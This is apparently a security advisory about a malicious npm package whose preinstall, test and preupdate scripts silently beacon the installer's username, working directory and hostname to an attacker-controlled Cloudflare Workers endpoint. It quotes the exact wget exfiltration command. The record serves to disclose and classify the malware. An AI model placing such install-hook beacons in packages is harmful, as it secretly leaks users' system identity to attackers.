summary: preinstall hook exfiltrates installer identity to attacker-controlled Cloudflare Workers endpoint
details: package.json declares a preinstall lifecycle script that runs `wget --quiet "http://orwa-orwa.dev-node-lap.workers.dev/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"`, firing automatically on `npm install`. The script leaks the installer's OS username, current working directory, and hostname to an attacker-controlled Cloudflare Workers endpoint over plain HTTP. The same beacon is duplicated in the `test` and `preupdate` scripts. The package ships no library code (no main module shipped), so its sole effect is the recon beacon. `unsafe-perm` is set, ensuring execution as root in privileged install contexts. This is a dependency-confusion / recon-beacon pattern: identity exfiltration with no legitimate purpose tied to the package's advertised function.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
